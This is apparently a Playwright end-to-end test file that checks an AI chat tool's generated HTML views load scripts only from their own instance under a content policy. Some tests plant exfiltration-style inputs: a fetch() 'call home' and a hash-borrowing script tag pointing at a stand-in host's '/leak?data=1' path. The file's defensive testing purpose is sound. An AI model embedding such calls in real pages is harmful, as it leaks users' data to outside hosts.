import { createHash, randomUUID } from "node:crypto";
import { readFile } from "node:fs/promises";
import { resolve } from "node:path";
import {
  expect,
  test,
  type APIRequestContext,
  type BrowserContext,
  type Page,
  type Request
} from "@playwright/test";
import postgres from "postgres";
import { z } from "zod";

// A generated view loads its runtime, Tailwind and Lucide, from the instance and nothing from
// anywhere else. Every test here refuses each request to a host other than the instance and
// then asks that none was attempted.

const apiOrigin = new URL(process.env.E2E_API_URL ?? "http://127.0.0.1:4210").origin;
const uiOrigin = new URL(process.env.E2E_UI_URL ?? "http://127.0.0.1:5273").origin;
const databaseUrl = `postgres://agent_chat:agent_chat@${process.env.E2E_HOST ?? "127.0.0.1"}:${process.env.E2E_POSTGRES_PORT ?? "55433"}/agent_chat`;
const serverCredential = process.env.E2E_SERVER_CREDENTIAL ?? "e2e-server-to-server-credential";
const user = { email: "e2e-user@example.test", password: "e2e-user-password" };

const runtimeDirectory = `${apiOrigin}/app-runtime/view/1/`;
const runtimeFiles = [`${runtimeDirectory}tailwind.js`, `${runtimeDirectory}lucide.js`];
const viewTitle = "Quarterly revenue";
const blockedNotice = "Part of this view could not load.";
// What a reverse proxy in front of an instance sends to the API. Everything else is interface.
const apiPathPattern = /^\/(?:api|auth|app-runtime)\/|^\/health$/u;

const storedViewFixture = z.object({
  view: z.string(),
  display: z.object({
    kind: z.literal("html.rendered"),
    version: z.literal(1),
    data: z.object({ html: z.string(), title: z.string() })
  })
});

async function readStoredView() {
  return storedViewFixture.parse(
    JSON.parse(await readFile(resolve("e2e/fixtures/view-stored-by-platform-1822780.json"), "utf8"))
  );
}

interface InstanceTraffic {
  /** Every address any frame asked for, whether or not a content policy let it leave. */
  requested: string[];
  /** Addresses outside the instance. Each was refused. */
  refused: string[];
  /** What the frames of generated views asked for. */
  requestedByViews: string[];
  /** What the frames of generated views were answered. */
  loadedByViews: string[];
}

/**
 * Refuses every host except the instance and records what was asked for. With `interfaceOrigin`
 * the interface's files are served on that origin too, the way a reverse proxy or another
 * site's own server would serve them.
 */
async function allowInstanceOnly(
  context: BrowserContext,
  interfaceOrigin: string = uiOrigin
): Promise<InstanceTraffic> {
  const traffic: InstanceTraffic = {
    requested: [],
    refused: [],
    requestedByViews: [],
    loadedByViews: []
  };
  const instanceOrigins = new Set([apiOrigin, uiOrigin, interfaceOrigin]);
  // A worker's request has no frame; a view runs none.
  const fromView = (request: Request) =>
    !request.serviceWorker() && request.frame().parentFrame() !== null;
  context.on("request", (request) => {
    const url = request.url();
    if (/^(?:data|blob|about):/u.test(url)) {
      return;
    }
    traffic.requested.push(url);
    if (fromView(request)) {
      traffic.requestedByViews.push(url);
    }
  });
  context.on("response", (response) => {
    if (fromView(response.request())) {
      traffic.loadedByViews.push(response.url());
    }
  });
  if (interfaceOrigin !== uiOrigin) {
    // The development server's reload channel is not part of the interface. Held open and
    // silent, it leaves the page alone.
    await context.routeWebSocket(/.*/u, () => undefined);
    // A page the test answers itself has no network address, so the browser takes it for a
    // public one and asks before it may call this machine. A deployed instance has no such step.
    await context.grantPermissions(["local-network-access"]);
  }
  await context.route("**/*", async (route) => {
    const url = new URL(route.request().url());
    if (!instanceOrigins.has(url.origin)) {
      traffic.refused.push(url.href);
      await route.abort("blockedbyclient");
      return;
    }
    const servedByInterface =
      url.origin === interfaceOrigin &&
      interfaceOrigin !== uiOrigin &&
      !(interfaceOrigin === apiOrigin && apiPathPattern.test(url.pathname));
    if (servedByInterface) {
      await route.fulfill({
        response: await route.fetch({ url: `${uiOrigin}${url.pathname}${url.search}` })
      });
      return;
    }
    await route.continue();
  });
  return traffic;
}

function viewHtml(extra = ""): string {
  return `<section class="grid gap-4"><div class="rounded-lg border bg-card p-4 text-card-foreground"><h2 class="flex items-center gap-2 text-lg font-semibold"><i data-lucide="chart-column"></i>${viewTitle}</h2><p class="text-muted-foreground">Four quarters</p><canvas id="chart" width="320" height="120"></canvas></div></section><script>(function(){var canvas=document.getElementById("chart");var context=canvas.getContext("2d");var palette=window.vivdCatalystTheme.chartPalette();[40,80,60,100].forEach(function(value,index){context.fillStyle=palette[index];context.fillRect(20+index*70,120-value,50,value)});canvas.setAttribute("data-drawn",String(Boolean(window.tailwind)&&Boolean(window.lucide)))})();</script>${extra}`;
}

/** What the test model reads as a call of `show_view`. */
function showViewMessage(html: string): string {
  return `/tool show_view ${JSON.stringify({ html, mode: "inline", title: viewTitle })}`;
}

/** Runs `show_view` through the agent and returns the conversation that holds the view. */
async function showView(
  request: APIRequestContext,
  headers: Record<string, string>,
  html: string
): Promise<{ id: string; title: string; collaborationWorkspaceId: string }> {
  const title = `View ${randomUUID()}`;
  const started = await request.post(`${apiOrigin}/api/conversations/runs`, {
    headers,
    data: {
      idempotencyKey: randomUUID(),
      conversation: { title },
      message: {
        text: showViewMessage(html)
      }
    }
  });
  expect(started.ok()).toBe(true);
  const { conversation } = z
    .object({
      conversation: z.object({ id: z.string(), collaborationWorkspaceId: z.string() })
    })
    .parse(await started.json());
  await expect
    .poll(async () => {
      const thread = await request.get(
        `${apiOrigin}/api/conversations/${encodeURIComponent(conversation.id)}/thread`,
        { headers }
      );
      expect(thread.ok()).toBe(true);
      const snapshot = z
        .object({
          activeRun: z.unknown().optional(),
          messages: z.array(z.object({ role: z.string() }))
        })
        .parse(await thread.json());
      return snapshot.activeRun === undefined && snapshot.messages.some((m) => m.role === "tool");
    })
    .toBe(true);
  return { ...conversation, title };
}

async function signIn(page: Page, origin: string): Promise<Record<string, string>> {
  const headers = { Origin: origin };
  const response = await page.request.post(`${apiOrigin}/api/auth/sign-in/email`, {
    headers,
    data: { ...user, rememberMe: true }
  });
  expect(response.ok()).toBe(true);
  return headers;
}

/** Styles from the compiler, the icon from Lucide, the chart from the view's own script. */
async function expectViewRendered(page: Page): Promise<void> {
  const view = page.frameLocator(`iframe[title="${viewTitle}"]`).first();
  const card = view.locator("section > div");
  const heading = view.getByRole("heading", { name: viewTitle });

  await expect(heading).toHaveCSS("display", "flex");
  await expect(heading).toHaveCSS("font-weight", "600");
  await expect(card).toHaveCSS("padding-top", "16px");
  // `rounded-lg` is the theme's radius: the bootstrap script configured the compiler.
  await expect(card).toHaveCSS("border-top-left-radius", "8px");
  await expect(card).toHaveCSS("border-top-width", "1px");
  await expect(heading.locator("svg.lucide-chart-column")).toBeVisible();
  // The inline chart script ran, and found both libraries of the runtime.
  await expect(view.locator("canvas")).toHaveAttribute("data-drawn", "true");
  // The frame is as tall as its content, so the view does not scroll inside itself.
  await expect
    .poll(() =>
      view
        .locator("html")
        .evaluate((root) => root.scrollHeight - (root.ownerDocument.defaultView?.innerHeight ?? 0))
    )
    .toBeLessThanOrEqual(0);
  await expect(page.getByText("Loading view…")).toHaveCount(0);
}

/**
 * Overwrites fields of the display a conversation's `show_view` call stored, the way an earlier
 * release or another tool would have written them. Returns the stored display versions.
 */
async function rewriteStoredDisplay(
  conversationId: string,
  display: Parameters<ReturnType<typeof postgres>["json"]>[0]
): Promise<(string | null)[]> {
  const sql = postgres(databaseUrl, { max: 1 });
  try {
    const rewritten = await sql<{ version: string | null }[]>`
      update messages
      set metadata = jsonb_set(
        metadata,
        '{agentRuntime,result,display}',
        (metadata #> '{agentRuntime,result,display}') || ${sql.json(display)}
      )
      where conversation_id = ${conversationId} and role = 'tool'
      returning metadata #>> '{agentRuntime,result,display,version}' as version
    `;
    expect(rewritten).toHaveLength(1);
    return rewritten.map((row) => row.version);
  } finally {
    await sql.end();
  }
}

function distinct(addresses: string[]): string[] {
  return Array.from(new Set(addresses)).sort();
}

/** No request left for another host, and the view asked for its two runtime files alone. */
function expectInstanceOnly(traffic: InstanceTraffic): void {
  expect(traffic.refused).toEqual([]);
  expect(distinct(traffic.requestedByViews)).toEqual(distinct(runtimeFiles));
  expect(distinct(traffic.loadedByViews)).toEqual(distinct(runtimeFiles));
}

test.describe("a generated view loads its runtime from the instance alone", () => {
  // The interface is served unbundled, and here every one of its requests passes a route.
  test.setTimeout(120_000);

  test("with the interface and the API on two origins", async ({ page, context }) => {
    const traffic = await allowInstanceOnly(context);
    const headers = await signIn(page, uiOrigin);
    const conversation = await showView(page.request, headers, viewHtml());

    await page.goto(`${uiOrigin}/c/${encodeURIComponent(conversation.id)}`);

    await expectViewRendered(page);
    await expect(page.getByText(blockedNotice)).toHaveCount(0);
    expectInstanceOnly(traffic);
  });

  test("with the interface and the API on one origin", async ({ page, context }) => {
    // The API's origin answers for both, as behind the reverse proxy of an operated instance.
    const traffic = await allowInstanceOnly(context, apiOrigin);
    const headers = await signIn(page, apiOrigin);
    const conversation = await showView(page.request, headers, viewHtml());

    await page.goto(`${apiOrigin}/c/${encodeURIComponent(conversation.id)}`);

    await expectViewRendered(page);
    await expect(page.getByText(blockedNotice)).toHaveCount(0);
    expectInstanceOnly(traffic);
    expect(new URL(page.url()).origin).toBe(apiOrigin);
  });

  test("in the embedded widget on a page of another origin", async ({ page, context, request }) => {
    // Another site: neither the interface's origin nor the API's, and allowed to call the API.
    const siteUrl = new URL(uiOrigin);
    siteUrl.hostname = siteUrl.hostname === "localhost" ? "127.0.0.1" : "localhost";
    const siteOrigin = siteUrl.origin;
    expect([apiOrigin, uiOrigin]).not.toContain(siteOrigin);

    const issued = await request.post(`${apiOrigin}/api/superadmin/session-tokens`, {
      headers: { "x-server-credential": serverCredential },
      data: {
        externalUserId: `embedded-${randomUUID()}`,
        displayLabel: "Embedded Visitor",
        roles: ["user"],
        permissionRefs: ["demo-tools"]
      }
    });
    expect(issued.ok()).toBe(true);
    const { chatSessionToken } = z
      .object({ chatSessionToken: z.string() })
      .parse(await issued.json());
    const conversation = await showView(
      request,
      { authorization: `Bearer ${chatSessionToken}` },
      viewHtml()
    );

    const traffic = await allowInstanceOnly(context, siteOrigin);
    // The widget hands the shell no route, and a token session of this build opens no
    // conversation by itself. The site's copy of the widget passes the conversation's route on.
    const widgetPath = `/@fs${resolve("packages/chat-widget/src/index.tsx")}`;
    const widgetModule = await (await request.get(`${uiOrigin}${widgetPath}`)).text();
    const tokenProp = "token: options.token,";
    expect(widgetModule).toContain(tokenProp);
    await page.route(`${siteOrigin}/site-widget.js`, (route) =>
      route.fulfill({
        contentType: "text/javascript",
        body: widgetModule.replace(tokenProp, `${tokenProp} route: options.route,`)
      })
    );
    // The site's own page mounts the widget where the standalone interface mounts itself.
    const interfacePage = await (await request.get(`${uiOrigin}/`)).text();
    const interfaceEntry = '<script type="module" src="/src/chat-main.tsx"></script>';
    expect(interfacePage).toContain(interfaceEntry);
    await page.route(`${siteOrigin}/another-site`, (route) =>
      route.fulfill({
        contentType: "text/html",
        body: interfacePage.replace(
          interfaceEntry,
          `<script type="module">
            import "/src/styles.css";
            import { mountChatWidget } from "/site-widget.js";
            mountChatWidget({
              container: document.getElementById("root"),
              apiBaseUrl: ${JSON.stringify(apiOrigin)},
              token: ${JSON.stringify(chatSessionToken)},
              route: ${JSON.stringify({
                kind: "conversation",
                collaborationWorkspaceId: conversation.collaborationWorkspaceId,
                conversationId: conversation.id
              })}
            });
          </script>`
        )
      })
    );

    await page.goto(`${siteOrigin}/another-site`);

    await expectViewRendered(page);
    await expect(page.getByText(blockedNotice)).toHaveCount(0);
    expectInstanceOnly(traffic);
    expect(new URL(page.url()).origin).toBe(siteOrigin);
  });

  test("for a view stored before the runtime moved onto the instance", async ({
    page,
    context
  }) => {
    const stored = await readStoredView();
    // The stored HTML carries the earlier release's head: its policy and its two script tags.
    expect(stored.display.data.html).toContain('<script src="https://cdn.tailwindcss.com">');
    expect(stored.display.data.html).toContain('<script src="https://unpkg.com/lucide@latest');

    const traffic = await allowInstanceOnly(context);
    const headers = await signIn(page, uiOrigin);
    const conversation = await showView(page.request, headers, stored.view);
    expect(await rewriteStoredDisplay(conversation.id, stored.display)).toEqual(["1"]);

    await page.goto(`${uiOrigin}/c/${encodeURIComponent(conversation.id)}`);

    await expectViewRendered(page);
    await expect(page.getByText(blockedNotice)).toHaveCount(0);
    expectInstanceOnly(traffic);
  });

  test("and no script of the API's origin outside the runtime directory", async ({
    page,
    context
  }) => {
    const consoleErrors: string[] = [];
    const outside = [`${apiOrigin}/health`, `${apiOrigin}/app-runtime/kit/1/kit.js`];
    const traffic = await allowInstanceOnly(context);
    const headers = await signIn(page, uiOrigin);
    const conversation = await showView(
      page.request,
      headers,
      viewHtml(outside.map((address) => `<script src="${address}"></script>`).join(""))
    );
    page.on("pageerror", (error) => consoleErrors.push(error.message));

    await page.goto(`${uiOrigin}/c/${encodeURIComponent(conversation.id)}`);

    // The view keeps its styles, its icon and its chart, and the host says what happened.
    await expectViewRendered(page);
    await expect(page.getByText(blockedNotice).first()).toBeVisible();
    await expect(
      page.frameLocator(`iframe[title="${viewTitle}"]`).first().locator("body")
    ).not.toContainText(/refused|blocked|error/iu);
    // The view asked for them, the policy refused, and neither left the browser.
    expect(traffic.refused).toEqual([]);
    expect(distinct(traffic.requestedByViews)).toEqual(distinct([...runtimeFiles, ...outside]));
    expect(distinct(traffic.loadedByViews)).toEqual(distinct(runtimeFiles));
    expect(consoleErrors).toEqual([]);
  });

  test("and nothing of another host for a script placed before the document", async ({
    page,
    context
  }) => {
    // The stored HTML opens with a script file and a call home, and only then its document.
    // Both stand before anything the composer could mistake for the place of its head.
    const elsewhere = "https://elsewhere.example.test";
    const traffic = await allowInstanceOnly(context);
    const headers = await signIn(page, uiOrigin);
    const conversation = await showView(
      page.request,
      headers,
      `<script src="${elsewhere}/first.js"></script><script>fetch("${elsewhere}/home").catch(function(){});</script><!-- <head> --><html><head><title>${viewTitle}</title></head><body>${viewHtml()}</body></html>`
    );

    await page.goto(`${uiOrigin}/c/${encodeURIComponent(conversation.id)}`);

    await expectViewRendered(page);
    await expect(page.getByText(blockedNotice).first()).toBeVisible();
    // The policy was in force before the first stored byte: neither request left the browser.
    expect(traffic.refused).toEqual([]);
    expect(traffic.requested.filter((address) => address.startsWith(elsewhere))).toEqual(
      traffic.requestedByViews.filter((address) => address.startsWith(elsewhere))
    );
    expect(distinct(traffic.loadedByViews)).toEqual(distinct(runtimeFiles));
  });

  for (const kind of ["html.rendered", "private_hydrated_view"] as const) {
    test(`and no script of another host that borrows the hash of an inline script (${kind})`, async ({
      page,
      context
    }) => {
      // A content policy that names an inline script by its hash also lets a script file of
      // any host pass when the file's integrity attribute carries that hash. The address
      // could carry data out of the view.
      const elsewhere = "https://elsewhere.example.test";
      const borrowed = "0";
      const integrity = `sha256-${createHash("sha256").update(borrowed).digest("base64")}`;
      const traffic = await allowInstanceOnly(context);
      const headers = await signIn(page, uiOrigin);
      const conversation = await showView(
        page.request,
        headers,
        `<h2>${viewTitle}</h2><script>${borrowed}</script><script src="${elsewhere}/leak?data=1" crossorigin="anonymous" integrity="${integrity}"></script><script>document.body.setAttribute("data-done","true")</script>`
      );
      await rewriteStoredDisplay(conversation.id, { kind });

      await page.goto(`${uiOrigin}/c/${encodeURIComponent(conversation.id)}`);

      const view = page.frameLocator(`iframe[title="${viewTitle}"]`).first();
      // The last inline script ran, so the script file before it was decided on.
      await expect(view.locator("body")).toHaveAttribute("data-done", "true");
      expect(traffic.refused).toEqual([]);
      await expect(page.getByText(blockedNotice).first()).toBeVisible();
    });
  }

  test("and runs the inline scripts the browser's parser finds, by its reading of them", async ({
    page,
    context
  }) => {
    const sha256 = (text: string) => createHash("sha256").update(text).digest("base64");
    const commented = "window.ran.push('comment');";
    const report =
      'document.body.setAttribute("data-ran",window.ran.join(","));document.body.setAttribute("data-done","true")';
    const stored = [
      `<h2>${viewTitle}</h2>`,
      "<script>window.ran=[];</script>",
      // Windows and old Mac line ends: the parser hands the script on with plain ones.
      "<script>\r\nwindow.ran.push('crlf');\r\n</script>",
      "<script>\rwindow.ran.push('cr');\r</script>",
      // An end tag may carry a space.
      "<script>window.ran.push('spaced end tag');</script >",
      // None of these is a script to the parser.
      `<!-- <script>${commented}</script> -->`,
      "<template><script>window.ran.push('template');</script></template>",
      "<textarea><script>window.ran.push('textarea');</script></textarea>",
      `<script>${report}</script>`
    ].join("");
    const traffic = await allowInstanceOnly(context);
    const headers = await signIn(page, uiOrigin);
    const conversation = await showView(page.request, headers, stored);

    await page.goto(`${uiOrigin}/c/${encodeURIComponent(conversation.id)}`);

    const frame = page.locator(`iframe[title="${viewTitle}"]`).first();
    const body = frame.contentFrame().locator("body");
    await expect(body).toHaveAttribute("data-done", "true");
    await expect(body).toHaveAttribute("data-ran", "crlf,cr,spaced end tag");
    const composed = (await frame.getAttribute("srcdoc")) ?? "";
    // The stored bytes reached the frame as they were written.
    expect(composed).toContain("<script>\r\nwindow.ran.push('crlf');\r\n</script>");
    expect(composed).toContain(`'sha256-${sha256("\nwindow.ran.push('crlf');\n")}'`);
    expect(composed).not.toContain(sha256(commented));
    expect(composed).not.toContain(sha256("window.ran.push('template');"));
    expect(composed).not.toContain(sha256("window.ran.push('textarea');"));
    expect(traffic.refused).toEqual([]);
  });
});
